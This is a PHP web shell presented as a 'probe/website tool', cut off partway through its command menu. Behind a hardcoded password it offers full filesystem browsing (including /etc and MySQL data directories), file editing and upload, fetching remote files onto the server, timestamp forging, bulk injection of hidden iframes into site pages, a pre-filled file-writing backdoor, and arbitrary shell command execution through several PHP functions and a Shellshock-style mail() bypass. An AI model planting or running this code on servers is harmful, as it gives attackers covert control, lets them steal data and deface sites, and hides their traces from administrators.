<?php
/**
 * 阿狗php探针/网站工具v2.01
 *
 * 免责声明：为人民服务，请勿用于非法用途
 *
 * @version  2.01
 * @author   QingYe
 * @email    1218 666 18 @ qq . com
 * @release  2023-04-16
 * @license  MIT
 *
 * 《分享一些比较强悍的PHP木马大全》 https://cloud.tencent.com/developer/article/1990316
 */
define('USER', 'user'); // 登录用户
define('PASS', 'pw123456'); // 登录密码
define('COOKIENAME', 'wrmfw'); // cookie名

Dog::run();

class Dog
{
    public static function run()
    {
        //error_reporting(0);
        error_reporting(E_ALL);
        set_time_limit(0);
        ini_set('memory_limit', '256M');
        define('SELF', str_replace('\\', '/', __FILE__));
        define('SELF_ROOT', str_replace('\\', '/', dirname($_SERVER['SCRIPT_FILENAME'])) . '/');
        define('SITE_ROOT', str_replace(str_replace('\\', '/', dirname($_SERVER['SCRIPT_NAME'])) . '/', '', SELF_ROOT));

        if (self::isLogin()) {
            $method = (g('a') ? g('a') : 'index') . 'Action';
            if (is_callable([__CLASS__, $method,])) self::$method();
        } else {
            self::loginAction();
        }
    }

    public static function isLogin()
    {
        return isset($_COOKIE[COOKIENAME]) && ($_COOKIE[COOKIENAME] == 'a1wyb9ai8mai' . md5('#为人民服务#' . USER . PASS . date('Ym')));
    }

    public static function logoutAction()
    {
        setcookie(COOKIENAME, '');
        unset($_COOKIE[COOKIENAME]);
        header('location: ?');
    }

    public static function loginAction()
    {
        $msg = '';
        if ($_POST) {
            if (p('username') == USER && p('password') == PASS) {
                setcookie(COOKIENAME, 'a1wyb9ai8mai' . md5('#为人民服务#' . USER . PASS . date('Ym')));
                header('location: ?');
                exit;
            }
            $msg = '<center>Invalid password.</center>';
        }
        exit('<!DOCTYPE HTML><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>*</title><body>' . $msg . '<div style="margin:100px auto; width:288px;"><canvas id="canvas" onclick="document.forms[0].style.display = \'block\';"></canvas><form method="post" style="display:none;position: absolute; top: 250px; padding-left: 20px;"><input name="username" placeholder="username" type="text" style="width:80px;"> <input name="password" placeholder="password" type="password" style="width:80px;"> <button type="submit">Login</button></form></div><script> (function () { var box = document.getElementById("canvas"); box.width = 288; box.height = 192; var ctx = box.getContext("2d"); ctx.beginPath(); ctx.rect(0, 0, 288, 192); ctx.closePath(); ctx.fillStyle = "#EE1C25"; ctx.fill(); drawStar(ctx, 12, 30, 48, 48, 0); drawStar(ctx, 4, 10, 96, 19, 18); drawStar(ctx, 4, 10, 115, 38, 123); drawStar(ctx, 4, 10, 115, 68, 72); drawStar(ctx, 4, 10, 96, 86, 175); function drawStar(ctx, r, R, x, y, rote) { ctx.beginPath(); for (var i = 0; i < 5; i++) { ctx.lineTo(Math.cos((18 + i * 72 - rote) / 180 * Math.PI) * R + x, -Math.sin((18 + i * 72 - rote) / 180 * Math.PI) * R + y); ctx.lineTo(Math.cos((54 + i * 72 - rote) / 180 * Math.PI) * r + x, -Math.sin((54 + i * 72 - rote) / 180 * Math.PI) * r + y); } ctx.closePath(); ctx.fillStyle = "#FFFF01"; ctx.fill(); } })(); </script></body></html>');
    }

    private static function display($html = '')
    {
        function menu()
        {
            $menu = [
                '网站'    => [
                    '本文件目录'     => '?a=file&path=' . SELF_ROOT,
                    '网站根目录'     => '?a=file&path=' . SITE_ROOT,
                    '环境信息'      => '?a=info',
                    'phpinfo()' => '?a=phpinfo" target="_blank',
                ],
                'shell' => [
                    '执行shell命令' => '?a=shell',
                    '扫描端口'      => '?a=port',
                ],
                '硬盘'    => [],
                '其他'    => ['退出' => 'javascript:if(confirm(\'退出? \')){window.location=\'?a=logout\'}',],
            ];
            $dv = [];
            if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') { // windows系统
                for ($i = 66; $i <= 90; $i++) {
                    $drive = chr($i) . ':';
                    if (is_dir($drive . '/')) {
                        $dv['本地磁盘(' . $drive . ')'] = '?a=file&path=' . $drive;
                    }
                }
                $menu['硬盘'] = $dv;
            } else {
                if (file_exists('/etc/')) $dv['/etc/'] = '?a=file&path=/etc/';
                if (file_exists('/etc/nginx/')) $dv['/etc/nginx/'] = '?a=file&path=/etc/nginx/';
                if (file_exists('/etc/php/')) $dv['/etc/php/'] = '?a=file&path=/etc/php/';
                if (file_exists('/etc/mysql/')) $dv['/etc/mysql/'] = '?a=file&path=/etc/mysql/';
                if (file_exists('/etc/redis/')) $dv['/etc/redis/'] = '?a=file&path=/etc/redis/';
                if (file_exists('/var/lib/mysql/')) $dv['/var/lib/mysql/'] = '?a=file&path=/var/lib/mysql/';
                $menu['硬盘'] = $dv;
            }
            $html = '<style>#menu{ display:none; padding:10px; } dl{line-height:25px;} dt {font-weight:bold;padding:3px;} dd a{background:#fff;display:block;padding:3px 20px;border:1px solid #dbdbdb;} dd a:hover{background:#f6f6f6;} </style>';
            $html .= '<div id="menu">';
            foreach ($menu as $title => $rs) {
                $html .= "<dl><dt>ⓞ {$title}</dt><dd><ul>";
                foreach ($rs as $text => $href) {
                    $html .= "<li><a href=\"$href\">$text</a></li>";
                }
                $html .= '</ul></dd></dl>';
            }
            $html .= '</div>';
            return $html;
        }

        $head = '<!DOCTYPE HTML><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>为人民服务</title><style>*{padding:0;margin:0;font-size:18px;} body{background:#bbb; color:#555; padding:0;} a{color:#555; text-decoration:none;} a:hover{color:#f60;} li{list-style:none;} button{padding:3px 5px 2px; font-size: 16px;}button:hover{background:#fff;color:#f60;} form{background: #fff; padding: 10px;border-radius:10px;} table{width:100%;min-width:1000px;background:#fff;border-top: 1px solid #dbdbdb; border-left: 1px solid #dbdbdb; border-right: 0; border-bottom: 0;} table td{border-top: 0; border-left: 0; border-right: 1px solid #dbdbdb; border-bottom: 1px solid #dbdbdb;padding:3px 3px 1px;} table tr:hover{background-color:#f6f6f6;}table tr td:hover{background:none;} aside{ position:fixed; top:0; width:100%; background: #efefef;} main{ padding:10px; margin:60px 10px; background:#efefef;border-radius:10px; display:inherit}</style></head><body>';

        $html .= '<dl><dd></dd></dl>';

        $top = '<div style="padding:10px;box-shadow: 0 15px 10px -10px #ccc;"> <button type="button" onclick="toggleMenu()" > 菜 单 </button> <a href="?" target="_blank">新窗口</a> <a>Server: ' . (isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : gethostbyname($_SERVER['SERVER_NAME'])) . ' </a> </div><script>
    var _on;
    function toggleMenu(){
        if (!_on){
            document.getElementById(\'menu\').style.display=\'inherit\';
            document.getElementsByTagName(\'main\')[0].style.display=\'none\';
        }else{
            document.getElementById(\'menu\').style.display=\'none\';
            document.getElementsByTagName(\'main\')[0].style.display=\'inherit\';
        }
        _on = !_on;
    }
    </script>';

        $to = '<div style="margin:50px 10px;text-align:right;"><button type="button" onclick="window.location=\'#\'" >↑ 顶部 ↑</button></div>';

        $foot = '</body></html>';

        header('Content-type: text/html; charset=utf-8');
        echo $head . '<aside>' . $top . menu() . '</aside><main>' . $html . $to . '</main>' . $foot;
        exit;
    }

    public static function indexAction()
    {
        header('location: ?a=file');
    }

    public static function fileAction()
    {
        $path = g('path') ? g('path') : SELF_ROOT;
        if (substr($path, -1, 1) == '/') $path = substr($path, 0, -1);
        $stype = g('stype') ? g('stype') : 'list';
        $type = g('type') ? g('type') : '搜文件名';
        $select = select('type', ['搜文件名', '搜文件内容',], $type);
        $keyword = trim(g('keyword'));

        $files = [];
        if ($stype == 'search') {
            $files = Tool::searchFiles($path, $keyword, $type);
        } else if ($stype == 'scan') {
            $files = Tool::searchContent($path, g('child'), explode('|', trim(g('ext'))));
        } else if ($stype == 'list') {
            $files = Tool::getDirAndFile($path);
        }

        $data = [];
        $linux = (strtoupper(substr(PHP_OS, 0, 3)) != 'WIN');
        foreach ($files as $key => $file) {
            if ($stype == 'scan') {
                $scanI = $file['队列'];
                $scanTime = $file['扫描'];
                $code = $file['可疑代码'];
                $file = $file['文件'];
                $name = str_replace(SITE_ROOT, '', $file);
            } else {
                $name = basename($file);
            }

            $rs = [];
            $size = $ope = $url = $isImg = $preview = '';
            if (is_dir($file)) {
                $isDir = 1;
                $aHtml = " <a href=\"?a=file&path={$file}\">{$name}</a>";
            } else {
                $isDir = 0;
                $size = Tool::formatSize(@filesize($file));
                $isImg = preg_match("/\.(gif|jpg|jpeg|png|bmp|ico)/", $file);
                $inSite = (stripos($file, SITE_ROOT) !== false);
                $url = $inSite ? str_replace(SITE_ROOT, '', $file) : ("?a=readFile&file={$file}" . ($isImg ? '&isImg=1' : ''));
                $aHtml = " <a href=\"{$url}\" target=\"_blank\">{$name}</a>";
                if ($isImg) $preview = "<img src=\"{$url}\" style=\"max-width:50px;max-height: 50px;\" onmouseover=\"imgIn(this.src, event)\" onmouseout=\"imgOut()\">";

                if (strstr('|zip|rar|gz|tar|iso|7z|', '|' . strtolower(pathinfo($file, PATHINFO_EXTENSION)) . '|')) {
                    $ope .= " <a href=\"javascript:\" onclick=\"var v=prompt('解压到目录：', '{$path}'); if(v){window.location='?a=fileUnzip&file={$file}&toDir='+v}\">解压</a>";
                } else {
                    $ope .= " <a href=\"?a=fileEdit&file={$file}\" target=\"_blank\">修改</a>";
                }
                $ope .= " <a href=\"?a=fileDown&file={$file}\">下载</a>";
            }

            $ope .= " <a href=\"javascript:\" onclick=\"var v=prompt('改名/移动到新路径：', '{$file}'); if(v){window.location='?a=fileRename&isDir={$isDir}&file={$file}&newPath='+v}\">改名</a>";
            $ope .= " <a href=\"javascript:\" onclick=\"if(confirm('删除? {$file}')){window.location='?a=fileDel&file={$file}'}\">删除</a>";
            $rs['选'] = "<input type=\"checkbox\" name=\"files[]\" value=\"{$file}\" style=\"width:22px;height: 22px;\"> ";
            $rs['预览'] = $preview;
            if (!empty($scanI)) $rs['队列'] = $scanI;
            if (!empty($scanTime)) $rs['扫描'] = $scanTime;
            $rs['路径'] = Tool::ico($file) . $aHtml;
            if (!empty($code)) $rs['可疑代码'] = $code;
            $rs['操作'] = $ope;
            $rs['时间'] = date('Y-m-d H:i:s', @filemtime($file));
            $rs['大小'] = $size;
            $rs['权限'] = substr(base_convert(@fileperms($file), 10, 8), -4);
            if ($linux) {
                $urr = posix_getpwuid(@fileowner($file));
                $grr = posix_getgrgid(@fileowner($file));
                $rs['用户:组'] = "<span title=\"用户：{$urr['name']} 组：{$grr['name']}\">{$urr['name']}</span>";
            }
            $data[] = $rs;
        }

        $p = '修改权限：\n 0444 r--r--r--\n 0600 rw-------\n 0644 rw-r--r--\n 0666 rw-rw-rw-\n 0700 rwx------\n 0744 rwxr--r--\n 0755 rwxr-xr-x\n 0777 rwxrwxrwx';
        $html = '<form method="GET">
        <div>
            <input type="hidden" name="a" value="file">
            <input type="hidden" name="stype">
            ' . btn('上级目录', '?a=file&path=' . dirname($path)) . '
            <input name="path" style="width:300px;" value="' . $path . '">
            <button type="submit" onclick="this.form.stype.value=\'list\'">转到目录</button>
            ' . $select . '
            <input name="keyword" style="width:100px;" value="' . $keyword . '" placeholder="关键字">
            <button type="submit" onclick="this.form.stype.value=\'search\'">搜索</button>
            <button type="button" onclick="document.getElementById(\'more\').style.display=\'block\'"> 更多功能>> </button>
        </div>
        <div style="display:none;padding:10px 0 0;" id="more">
            <button type="button" onclick="window.location=\'?a=upload&path=' . $path . '/\'">上传到服务器</button>
            <button type="button" onclick="window.location=\'?a=download&path=' . $path . '/\'">下载到服务器</button>
            <button type="button" onclick="window.location=\'?a=fileEdit&file=' . $path . '/新建文件.php\'" >新建文件</button>
            <button type="button" onclick="var v=prompt(\'新建文件夹：\', \'' . $path . '/新建文件夹\'); if(v){window.location=\'?a=fileDir&newDir=\'+v}" >新建文件夹</button>
            <button type="button" onclick="window.location=\'?a=batEdit&ope=add&path=' . $path . '/\'">追加文本</button>
            <button type="button" onclick="window.location=\'?a=batEdit&ope=edit&path=' . $path . '/\'">替换文本</button>
            <button type="button" onclick="window.location=\'?a=scan&path=' . $path . '/\'">扫描木马</button>
            <button type="button" onclick="document.getElementById(\'more\').style.display=\'none\'"> ╳ </button>
        </div>
        </form>';

        $html .= '<br><form method="post" enctype="multipart/form-data" action="">';
        $html .= Tool::table(Tool::ico($path) . basename($path) . ' 共' . count($data) . '项', $data);
        $html .= '<br><input name="to" type="hidden" value="">
            <input name="chkBtn" type="checkbox" onclick="checkAll(this.form);" style="width:22px;height: 22px;"> 全选' . count($data) . '项
            <button type="button" onclick="submitForm(this.form, \'?a=fileZip\', \'压缩包存放路径: \', \'' . ($path . '/' . $_SERVER['SERVER_NAME'] . date('.Ymd') . '.zip') . '\')" >打包</button>
            <button type="button" onclick="submitForm(this.form, \'?a=fileCopy\', \'复制到目录下: \', \'' . $path . '\')" >复制</button>
            <button type="button" onclick="submitForm(this.form, \'?a=fileTime\', \'修改时间: ' . date('Y-m-d H:i:s') . '\', \'2001-01-01 01:01:01\')" >修改时间</button>
            <button type="button" onclick="submitForm(this.form, \'?a=filePerms\', \'' . $p . '\', \'0777\')" >修改权限</button>
            <button type="button" onclick="submitForm(this.form, \'?a=fileDel\', \'\', \'确定删除勾选的？\')" >删除</button>
        </form>';

        $html .= <<<EOT
<script>
    function checkAll(form) {
        for (var i = 0; i < form.elements.length; i++) {
            var e = form.elements[i];
            if (e.name != 'chkBtn') e.checked = form.chkBtn.checked;
        }
    }
    function submitForm(form, act, msg, val) {
        var v = prompt(msg, val);
        if (v) {
            form.action = act;
            form.to.value = v;
            form.submit();
        }
    }
    function imgIn(src, e) {
        var winScroll = document.documentElement.ownerDocument.scrollingElement.scrollTop;
        var winHeight = document.documentElement.clientHeight;
        var winWidth = document.documentElement.clientWidth;
        var div = document.getElementById('preview');
        div.innerHTML = '<img src="' + src + '" style="border-radius:10px;box-shadow:2px 2px 5px #000;max-height:' + (winHeight) + 'px;max-width:' + (winWidth - (e.pageX + 20) - 20) + 'px;">';
        div.style.position = 'absolute';
        div.style.display = 'inherit';
        var img = div.firstElementChild;
        div.style.top = (winScroll + Math.max(0, (winHeight - img.height) / 2)) + 'px';
        div.style.left = (e.pageX + 20) + 'px';
    }
    function imgOut() {
        document.getElementById('preview').style.display = 'none';
    }
</script>
<div id="preview"></div>
EOT;
        self::display($html);
    }

    public static function fileEditAction()
    {
        $file = p('file') ? p('file') : g('file');
        $backupName = 'BAK.' . date('Y_m_d_H_i_s.') . basename($file);
        if ($_POST) {
            $content = p('content');
            $content = Tool::convertEncoding($content, 'utf-8', p('coding'));
            Tool::createDir(dirname($file));

            if (file_exists($file) && p('backup')) {
                ($time = @filemtime($file)) && $exists = true;
                // 修改前备份一份
                $to = dirname($file) . '/' . $backupName;
                if (!copy($file, $to)) self::display(btn() . '<br><br>' . '备份失败：' . $file);
                @touch($to, $time, $time);
            }

            $ret = file_put_contents($file, $content);
            (!empty($time)) && @touch($file, $time, $time);

            $msg = $ret ? "已保存: {$file}" : "保存失败";
            (!empty($to)) && $msg .= "<br>已备份：{$to}";
            self::display(btn('返回目录', '?a=file&path=' . dirname($file)) . '<br><br>' . $msg);
        }
        $coding = 'utf-8';
        if (file_exists($file)) {
            $mod = '修改文件';
            $content = @file_get_contents($file);
            if ($content) {
                $coding = Tool::getEncode($content);
                $content = Tool::convertEncoding($content, $coding, 'utf-8');
                $content = htmlspecialchars($content);
            } else {
                $content = '没有权限读取文件，或者文件为空';
            }
            $isBackup = " <br><br>是否备份：<input type=\"checkbox\" name=\"backup\" value=\"1\" checked /> 修改前备份为“{$backupName}”";
        } else {
            $mod = '新建文件';
            $isBackup = '';
            $content = '<?php if(isset($_POST["content"])&&$fun="file_pu"."t_contents")$fun(dirname(__FILE__)."/post_content.php", $_POST["content"]);?>';
        }
        $select = select('coding', ['utf-8', 'gb2312', 'gbk', 'big5', 'euc-kr', 'euc-jp', 'shift-jis', 'windows-874', 'iso-8859-1', 'ascii',], $coding);
        self::display(btn('返回目录', '?a=file&path=' . dirname($file)) . "<br><br><form method=\"post\">{$mod}：<input name=\"file\" value=\"{$file}\" style=\"width:90%;\"/> <br><br>文件编码：{$select} {$isBackup}<br><br> 文件内容：<textarea name=\"content\" style=\"width:90%;height:600px;\">$content</textarea>  <br><br> <button type=\"submit\">保存{$mod}</button> </form>");
    }

    public static function fileDirAction()
    {
        $dir = g('newDir');
        if ($dir) {
            $r = Tool::createDir($dir);
        }
        self::display(btn('查看目录', '?a=file&path=' . dirname($dir)) . '<br><br>' . (empty($r) ? '错误' : ('已创建：' . $dir)));
    }

    public static function fileDelAction()
    {
        $file = g('file');
        $files = p('files');
        $arr = [];
        if ($file) {
            if (is_dir($file) ? Tool::deleteDir($file) : @unlink($file)) $arr[] = $file;
        } else if (is_array($files)) {
            foreach ($files as $file) {
                if (is_dir($file) ? Tool::deleteDir($file) : @unlink($file)) $arr[] = $file;
            }
        }
        self::display(btn('返回目录', '?a=file&path=' . dirname($file)) . '<br><br>已删除个数：' . count($arr) . '<br><br>' . implode('<br>', $arr));
    }

    public static function fileRenameAction()
    {
        $file = g('file');
        $newPath = g('newPath');
        $isDir = g('isDir');
        if (empty($file)) self::display(btn() . '<br><br>未选择文件夹或文件');
        if (file_exists($newPath)) self::display(btn() . '<br><br>已存在相同文件/文件夹');
        if (stripos($newPath . '/', $file . '/') !== false) self::display(btn() . '<br><br>不能移到自己的子目录下');

        Tool::createDir($isDir ? $newPath : dirname($newPath));
        $r = rename($file, $newPath);

        self::display(btn('查看目录', '?a=file&path=' . dirname($newPath)) . '<br><br>' . ($r ? ('已改名：' . $newPath) : '错误'));
    }

    public static function fileCopyAction()
    {
        $files = p('files');
        $to = Tool::formatPath(p('to'));
        $n = 0;
        if (is_array($files)) foreach ($files as $from) {
            $_to = $to . basename($from);
            if (is_dir($from)) {
                $n += Tool::copyDir($from, $_to);
            } else {
                $n += intval(copy($from, $_to));
            }
        }
        self::display(btn('查看目录', "?a=file&path={$to}") . '<br><br>复制到：' . $to . '<br>复制文件总数: ' . $n);
    }

    public static function fileTimeAction()
    {
        $files = p('files');
        if (empty($files)) self::display(btn() . '<br><br>未选择文件夹或文件');
        $to = p('to');
        $_to = strtotime($to);

        $n = 0;
        if (is_array($files)) foreach ($files as $file) {
            $n += Tool::setFileTime($file, $_to);
        }

        self::display(btn('查看目录', '?a=file&path=' . dirname($file)) . '<br><br>修改时间为: ' . $to . '<br>成功个数：' . $n);
    }

    public static function filePermsAction()
    {
        $files = p('files');
        if (empty($files)) self::display(btn() . '<br><br>未选择文件夹或文件');
        $to = p('to');
        if (!preg_match('/^[0-7]{4}$/', $to)) self::display(btn() . '<br><br>权限值错误');
        $_to = base_convert($to, 8, 10);

        $n = 0;
        if (is_array($files)) foreach ($files as $file) {
            $n += Tool::setFilePerms($file, $_to);
        }

        self::display(btn('查看目录', '?a=file&path=' . dirname($file)) . '<br><br>权限为: ' . $to . '<br>成功个数：' . $n);
    }

    public static function fileZipAction()
    {
        function _zip($zip, $fromDir)
        {
            if (is_array($fromDir)) {
                $files = [];
                foreach ($fromDir as $from) {
                    if (is_dir($from)) {
                        $files = array_merge($files, Tool::getFiles($from, true));
                    } else {
                        $files[] = $from;
                    }
                }
                $delPre = dirname(current($fromDir));
            } else {
                $files = Tool::getFiles($fromDir, true);
                $delPre = dirname($fromDir);
            }

            $class = new ZipArchive;
            if ($class->open($zip, (file_exists($zip) ? ZipArchive::OVERWRITE : ZipArchive::CREATE)) === true) {
                foreach ($files as $file) {
                    $r = $class->addFile($file, str_replace($delPre, '', $file));
                }
                $class->close();
            }
            return !empty($r);
        }

        $files = p('files');
        $to = p('to');
        if (empty($files)) self::display(btn() . '<br><br>未选择文件夹或文件');

        $r = _zip($to, $files);

        self::display(btn('查看目录', '?a=file&path=' . dirname($to)) . '<br><br>' . ($r ? '已打包到：' . $to : '错误'));
    }

    public static function fileUnzipAction()
    {
        function _unzip($zip, $toDir = '.')
        {
            clearstatcache();
            $class = new ZipArchive;
            if ($class->open($zip) === true) {
                $class->extractTo($toDir);
                $class->close();
                return true;
            } else {
                return false;
            }
        }

        $file = g('file');
        $to = g('toDir');
        if (empty($file)) self::display(btn() . '<br><br>请求为空');

        $r = _unzip($file, $to);

        self::display(btn('查看目录', '?a=file&path=' . $to) . '<br><br>' . ($r ? '已解压到：' . $to : '错误'));
    }

    public static function fileDownAction()
    {
        $file = g('file');
        $info = pathinfo($file);
        header('Content-Description: File Transfer');
        header('Content-type: application/x-' . $info['extension']);
        header('Content-Transfer-Encoding: binary');
        header('Accept-Ranges: bytes');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        header('Content-Disposition: attachment; filename=' . $info['basename']);

        $fp = fopen($file, 'rb');
        fseek($fp, 0);
        ob_start();
        while (!feof($fp)) {
            echo fread($fp, 1024 * 1024 * 2); // 每次输出2MB
            ob_flush();
            flush();
        }
        ob_end_clean();
        fclose($fp);
    }

    public static function downloadAction()
    {
        function _download($url, $file)
        {
            $n = 0;
            $fpO = fopen($url, 'rb');
            $fpN = fopen($file, 'w');
            while (!feof($fpO)) {
                $contents = fread($fpO, 1024 * 1024 * 2); // 每次读取2M
                $n += fwrite($fpN, $contents);
            }
            fclose($fpO);
            fclose($fpN);
            return $n;
        }

        if ($_POST) {
            $file = p('file');
            $url = p('url');
            $n = _download($url, $file);
            self::display(btn('查看目录', '?a=file&path=' . dirname($file)) . "<br><br> $file <br>" . ($n > 0 ? "下载成功，文件大小: " . Tool::formatSize($n) : '下载失败'));
        }
        self::display('下载文件到服务器<br><br><form method="post"> 文件网址：<input name="url" value="" placeholder="http://" style="width:90%;"/> <br><br>保存路径：<input name="file" value="' . g('path') . date('Y_m_d_H_i_s') . '.zip" style="width:90%;"/> <br><br> <button type="submit">下载</button></form>');
    }

    public static function uploadAction()
    {
        if ($_POST) {
            $path = rtrim(p('path'), '/');
            $n = 0;
            Tool::createDir($path);
            $f = $_FILES['file'];
            if ($f['error'] == UPLOAD_ERR_OK) {
                $tmp = $f['tmp_name'];
                $file = $path . '/' . $f['name'];
                ((function_exists('move_uploaded_file') && move_uploaded_file($tmp, $file)) || @copy($tmp, $file)) && $n++;
            }
            self::display(btn('查看目录', '?a=file&path=' . $path) . "<br><br>成功上传个数：" . $n . ($n > 0 ? '<br><br>已上传：' . $file : ''));
        }
        self::display('上传文件 （限制大小' . get_cfg_var('upload_max_filesize') . '）<br><br><form method="post" enctype="multipart/form-data"> 保存路径：<input name="path" value="' . g('path') . '" style="width:90%;"/>  <br><br>选择文件：<input type="file" name="file" /> <br><br> <button type="submit">上传</button></form>');
    }

    // 读取网站目录外的文件
    public static function readFileAction()
    {
        $path = g('file');
        if (g('isImg')) {
            header("content-type:image/png\r\n");
            @readfile($path);
        } else {
            $ret = @file_get_contents($path);
            if (!empty($ret)) {
                $coding = Tool::getEncode($ret);
                if (($coding != 'utf-8')) $ret = Tool::convertEncoding($ret, $coding, 'utf-8');
                header('Content-type: text/html; charset=utf-8');
                echo '<pre>' . htmlspecialchars($ret) . '</pre>';
            }
        }
    }

    public static function batEditAction()
    {
        $ope = p('ope') ? p('ope') : g('ope');
        $path = p('path') ? p('path') : g('path');
        if ($_POST) {
            $_html = '<br><br>' . btn('查看目录', '?a=file&path=' . $path);
            $path = p('path');
            $code = p('slash') ? stripslashes(p('code')) : p('code');
            if ($ope == 'edit') {
                $codeNew = p('slash') ? stripslashes(p('codeNew')) : p('codeNew');
                $list = Tool::replaceContent($path, $code, $codeNew, p('child'), explode('|', trim(p('ext'))));
                $_html .= '<br><br>被替换的文件个数：' . count($list) . Tool::table2($list);
            } else {
                $list = Tool::addContent($path, $code, p('child'), explode('|', trim(p('ext'))));
                $_html .= '<br><br>被追加的文件个数：';
            }
            $_html .= count($list) . Tool::table2($list);
        }
        $child = (p('child') || ($_SERVER['REQUEST_METHOD'] == 'GET')) ? ' checked="checked"' : '';
        $ext = p('ext') ? p('ext') : 'php|asp|aspx|jsp|cgi|shtml|html|htm';
        $code = p('code') ? p('code') : ($ope == 'edit' ? '<body>' : ('<iframe src=http://localhost/x.html width=1 height=1>' . '</iframe>'));
        $slash = p('slash') ? ' checked="checked"' : '';
        $codeNew = p('codeNew') ? p('codeNew') : '<body><iframe src=http://localhost/x.html width=1 height=1>' . '</iframe>';

        $code = htmlspecialchars($code);
        $codeNew = htmlspecialchars($codeNew);
        $btn = '<button type="submit" onclick="this.form.ope.value=\'add\'">批量追加</button>';
        if ($ope == 'edit') $btn = '<button type="submit" onclick="this.form.ope.value=\'edit\'">批量替换</button>';
        $html = '追加/替换 内容<br><br><form method="post" onsubmit="if(!confirm(\'确定批量操作?\')){return false}"><input name="ope" type="hidden" value="">
            目录：<input name="path" value="' . $path . '" style="width:90%;"/>
            <br><br>遍历：<input type="checkbox" name="child" value="1" ' . $child . '/> 是否包括子目录
            <br><br>后缀：<input name="ext" value="' . $ext . '" style="width:90%;"/>
            <br><br>内容：<textarea name="code" style="width:90%;height:100px;">' . $code . '</textarea>';
        if ($ope == 'edit') $html .= '<br><br>替换：<textarea name="codeNew" style="width:90%;height:100px;">' . $codeNew . '</textarea>';
        $html .= '<br><br><input type="checkbox" name="slash" value="1" ' . $slash . '/> 文本用stripslashes()处理。(删除反斜杠)
            <br><br>
            ' . $btn . '
        </form>';
        self::display($html . (!empty($_html) ? $_html : ''));
    }

    public static function scanAction()
    {
        $path = g('path');
        $html = '扫描木马<br><br><form method="get">
            <input type="hidden" name="a" value="file">
            <input type="hidden" name="stype" value="scan">
            扫描目录：<input name="path" value="' . $path . '" style="width:90%;"/>
            <br><br>是否遍历：<input type="checkbox" name="child" value="1" checked/> 是否包括子目录
            <br><br>扫描后缀：
            <select name="ext">
                <option value="php|asp|aspx|jsp|html|htm|jpg|gif|png">全部文件：php|asp|aspx|jsp|html|htm|jpg|gif|png</option>
                <option value="php|asp|aspx|jsp|html|htm" selected>网页文件：php|asp|aspx|jsp|html|htm （推荐）</option>
                <option value="php|asp|aspx|jsp">动态文件：php|asp|aspx|jsp</option>
                <option value="html|htm">静态文件：html|htm</option>
                <option value="jpg|gif|png">图片文件：jpg|gif|png （参考：扫描10万张图片约耗时1小时）</option>
            </select>
            <br><br><button type="submit">开始扫描</button>
        </form>';
        self::display($html);
    }

    public static function shellAction()
    {
        function _exec($cmd)
        {
            @exec($cmd, $output);
            return implode("\n", $output);
        }

        function _shell_exec($cmd)
        {
            return @shell_exec($cmd);
        }

        function _system($cmd)
        {
            @ob_start();
            @system($cmd);
            $ret = @ob_get_contents();
            @ob_end_clean();
            return $ret;
        }

        function _passthru($cmd)
        {
            @ob_start();
            @passthru($cmd);
            $ret = @ob_get_contents();
            @ob_end_clean();
            return $ret;
        }

        function _popen($cmd)
        {
            $ret = '';
            $fp = @popen($cmd, 'r');
            while (!@feof($fp)) {
                $ret .= @fread($fp, 1024);
            }
            @pclose($fp);
            return $ret;
        }

        function _proc_open($cmd)
        {
            $ret = '';
            $length = strcspn($cmd, " \t");
            $token = substr($cmd, 0, $length);
            if (isset($aliases[$token])) $cmd = $aliases[$token] . substr($cmd, $length);
            $fp = proc_open($cmd, [1 => ['pipe', 'w',], 2 => ['pipe', 'w',],], $pipes);
            while (!feof($pipes[1])) {
                $ret .= htmlspecialchars(fgets($pipes[1]), ENT_COMPAT, 'UTF-8');
            }
            while (!feof($pipes[2])) {
                $ret .= htmlspecialchars(fgets($pipes[2]), ENT_COMPAT, 'UTF-8');
            }
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($fp);
            return $ret;
        }

        function _mail($cmd)
        {
            if (strstr(@readlink('/bin/sh'), 'bash') == false) return 'readlink failed to read the symbolic link (/bin/sh)';
            $tmp = tempnam('.', 'data');
            putenv("PHP_LOL=() { x; }; $cmd > $tmp 2>&1");
            mail('null@127.0.0.1', '', '', '', '-bv');
            $ret = @implode('', (array)@file($tmp));
            @unlink($tmp);
            return $ret;
        }

        //else function: $conn = @ssh2_connect($host, $port)

        $fun = g('fun');
        $cmd = g('cmd');
        $repeat = intval(g('repeat'));
        $ret = '';
        if (!empty($cmd)) {
            $cmd = base64_decode($cmd);
            $_fun = '_' . $fun;
            if (is_callable($_fun)) $ret = $_fun($cmd); // 执行命令
            if (!empty($ret)) {
                $coding = Tool::getEncode($ret);
                if (($coding != 'utf-8')) $ret = Tool::convertEncoding($ret, $coding, 'utf-8');
                $ret = htmlspecialchars($ret);
                $cmd = htmlspecialchars($cmd);
            }
        }
        if (empty($fun)) {
            $fun = 'exec';
            $cmd = 'ls -alF ~/ 2>&1';
            $ret = '
╱╱╱╱╱╱╱╱╱╱╱╱╱╱╭━╮
╱╱╱╱╱╱╱╱╱╱╱╱╱╱┃╭╯
╭╮╭╮╭╮╭━╮╭╮╭╮╭╯╰╮╭╮╭╮╭╮
┃╰╯╰╯┃┃╭╯┃╰╯┃╰╮╭╯┃╰╯╰╯┃
╰╮╭╮╭╯┃┃╱┃┃┃┃╱┃┃╱╰╮╭╮╭╯
╱╰╯╰╯╱╰╯╱╰┻┻╯╱╰╯╱╱╰╯╰╯
╱╱╱╱ 为人民服务 ╱╱╱╱
';
        }


        if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') { // windows系统
            $select = '
    <select onchange=\'this.form.cmd.value= options[selectedIndex].value\'>
        <option value=""> -- win系统 -- </option>
        <option value="dir C:\">列出目录：dir C:\</option>
        <option value="ipconfig">查看ip：ipconfig</option>
        <option value="tasklist -svc">查看进程：tasklist -svc</option>
        <option value="netstat -ano">查看端口：netstat -ano</option>
        <option value="&quot;D:\Program Files\php\php.exe&quot; --ini">php配置文件：&quot;D:\Program Files\php\php.exe&quot; --ini</option>
    </select>';
        } else {
            $select = '
    <select onchange=\'this.form.cmd.value= options[selectedIndex].value\'>
        <option value=""> -- linux系统 -- </option>
